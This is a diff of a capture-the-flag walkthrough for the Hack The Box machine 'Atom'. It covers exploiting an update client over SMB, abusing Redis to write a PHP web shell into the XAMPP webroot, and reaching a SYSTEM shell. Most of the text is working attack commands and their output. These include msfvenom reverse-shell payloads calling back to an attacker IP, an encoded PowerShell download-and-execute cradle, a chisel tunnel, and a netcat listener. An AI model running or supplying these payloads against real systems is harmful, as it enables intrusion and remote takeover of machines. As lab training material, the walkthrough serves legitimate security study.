@@ -1,5 +1,7 @@
 # Atom @ 10.10.237
 
+Note that this box is rather unstable, once the update client has been used it does not seem to work a second time.
+
 ## Enumeration
 
 First an nmap scan
@@ -147,11 +149,7 @@ pwsh> [convert]::ToBase64String([system.text.encoding]::Unicode.GetBytes($s))
 aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAyAC8AcgBlAHYAcwBoAGUAbAA0ADQANAA0AC4AcABzADEAIAAtAHUAcwBlAGIAKQA=
 ```
 
-With revshel4444.ps1 a powershell reverse shell connecting back on port 4444
-
-```
-$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f psh -o rev4444.ps1       
-```
+With revshel4444.ps1 a powershell reverse shell connecting back on port 4444, like https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
 
 Create a file with Something as content and a filename which has the vulnerability in it
 
@@ -175,6 +173,8 @@ sha512: otVi427RYTHM7rC72XSPdQp69V789nYNoAj4FBBQfW5wp5ouQ3ARugP+HKeC+JbmoaCqznU2
 releaseDate: '2021-04-20T11:17:02.627Z'
 ```
 
+
+
 Start a  httpserver hosting the reverse shell and a netcat listener on port 4444 to catch the reverse shell. 
 
 ```
@@ -197,6 +197,21 @@ smb: \client1\>
 And now we wait... And there we go!
 
 ![](.images/image-20210725-161458.481.png)
+
+
+**Scrap that**, get a better shell
+
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f exe -o rev4444.exe
+$ sha512sum rev4444.exe | cut -d ' ' -f1 | xxd -r -p | base64 -w0 
+5/FCHD5g3yGtoKov7EKrDSt1XcH0kSAyA5azYEHQk50aBngA3MpFLN+gleO+SvyHgGSHKDFTU6ubPGql03P1DQ==  
+$ mv rev4444.exe "rev'4444.exe"
+
+smb: \client2\> put latest.yml
+putting file latest.yml as \client2\latest.yml (3.0 kb/s) (average 3.0 kb/s)
+smb: \client2\> put rev'4444.exe 
+putting file rev'4444.exe as \client2\rev'4444.exe (77.8 kb/s) (average 40.6 kb/s)
+smb: \client2\> 
+
 
 ## More enumeration
 
@@ -256,7 +271,6 @@ Excellent. Let's forward this port back to Kali so we can access it with a redis
 Start chisel server on kali
 ```
 $ sudo chisel/1.7.3/chiselx64 server -p 3636 -reverse
-[sudo] password for kali: 
 2021/04/20 16:51:38 server: Reverse tunnelling enabled
 2021/04/20 16:51:38 server: Fingerprint oFkUNH2YW0dqSbHy4OsE/A6XWJHxPc22SKFX03lOXt4=
 2021/04/20 16:51:38 server: Listening on http://0.0.0.0:3636
@@ -265,7 +279,7 @@ $ sudo chisel/1.7.3/chiselx64 server -p 3636 -reverse
 
 Download chisel and connect to server
 ```
-PS C:\Users\jason> iwr http://10.10.14.22:8080/chisel/1.7.3/chisel64.exe -out chisel.exe -useb
+PS C:\Users\jason> iwr http://10.10.14.22:80/chisel/1.7.3/chisel64.exe -out chisel.exe -useb
 PS C:\Users\jason> start-process "chisel.exe" "client 10.10.14.22:3636 R:6379:127.0.0.1:6379"
 ```
 
@@ -306,18 +320,20 @@ Apache2.4                                                                       
 
 Apache is part of XAMPP and is running as system! So lets get to work:
 
+
+## Privilege escalation
+
 Create files in the webroot of xampp. 
 
 ```
-127.0.0.1:6379> AUTH kidvscat_yes_kidvscat
+$ redis-cli 
+127.0.0.1:6379> auth kidvscat_yes_kidvscat
 OK
 127.0.0.1:6379> config set dir c:\\xampp\\htdocs
 OK
-127.0.0.1:6379> config set dbfilename "test.html"
-OK
 127.0.0.1:6379> config set dbfilename "shell.php"
 OK
-127.0.0.1:6379> set test "<?php system($_GET['cmd']); ?>"
+127.0.0.1:6379> set shell "<?php system($_GET['cmd']); ?>"
 OK
 127.0.0.1:6379> save
 OK
@@ -326,38 +342,36 @@ OK
 Does it work?
 
 ```
-$ curl http://atom.htb/shell.php?cmd=ipconfig --output -
-REDIS0006�test
-Windows IP Configuration
-
-
-Ethernet adapter Ethernet0:
-
-   Connection-specific DNS Suffix  . : 
-   IPv6 Address. . . . . . . . . . . : dead:beef::8487:286c:d24a:a6f7
-   Temporary IPv6 Address. . . . . . : dead:beef::a5cd:42d6:3dc3:e51c
-   Link-local IPv6 Address . . . . . : fe80::8487:286c:d24a:a6f7%6
-   IPv4 Address. . . . . . . . . . . : 10.10.10.237
-   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:c05b%6
-                                       10.10.10.2
-����$ɸ�       
-
-$ curl http://atom.htb/shell.php?cmd=whoami --output -
-REDIS0006�testnt authority\system
-����$ɸ�   
+$ curl http://10.10.10.237/shell.php?cmd=whoami --output -
+REDIS0006�0pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0�@�@�{"Id":"e8e52790a0","Name )a4949d
+Email�          Administrator Initials ▒ 
+ncryptedPasswor@fOdh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi ARol�f Inactiv f de,"TimeStamp":637530169606440253}
+                           pk:ids:User$e8e29158-d70d-44b1-a1ba-4949d52790a0pk:ids:MetaDataClass�$ff�-@��ff�%9pk:urn:metadataclass:f�-@��ff�@�AJ{"Id":"f�","SchemaVersion 24.2.0.0�Modifie@T\/Date(1617420120 -0700)\/�6By Ze8e29158d70d44b1a1ba4949d52790asCheck�r    -621355968 r@t �
+t�7`s !� �TimeStamp":637530169345346438}shellnt authority\system
+���ȩ�:7     
 ```
 
-Excellent! Use it to fire up a new reverse shell.
+Excellent! Somewhere near the end it confirms we are system! Use it to fire up a new reverse shell.
 
 ```
-pwsh> $s = "iex(iwr http://10.10.14.22/revshel4455.ps1 -useb)"
-pwsh> [convert]::ToBase64String([system.text.encoding]::Unicode.GetBytes($s))
-aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAyAC8AcgBlAHYAcwBoAGUAbAA0ADQANQA1AC4AcABzADEAIAAtAHUAcwBlAGIAKQA=
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=5555 -f exe -o rev5555.exe
 
-$ curl --output - http://atom.htb/shell.php?cmd=powershell%20-encodedcommand%20aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAyAC8AcgBlAHYAcwBoAGUAbAA0ADQANQA1AC4AcABzADEAIAAtAHUAcwBlAGIAKQA=
+PS C:\Users\jason>  iwr http://10.10.14.22:80/rev5555.exe -out rev5555.exe  
+
+$ curl http://10.10.10.237/shell.php?cmd=c:/users/jason/rev5555.exe --output -
+
+$ nc -nlvp 5555             
+listening on [any] 5555 ...
+connect to [10.10.14.22] from (UNKNOWN) [10.10.10.237] 58726
+Microsoft Windows [Version 10.0.19042.906]                                
+(c) Microsoft Corporation. All rights reserved.                           
+                                                                          
+C:\xampp\htdocs>whoami                                                    
+whoami                                                                    
+nt authority\system                                                       
+
+C:\xampp\htdocs>hostname
+hostname
+ATOM
+
 ```
-
-Start an nc listener and get root
-
-![](.images/image-20210725-170847.420.png)
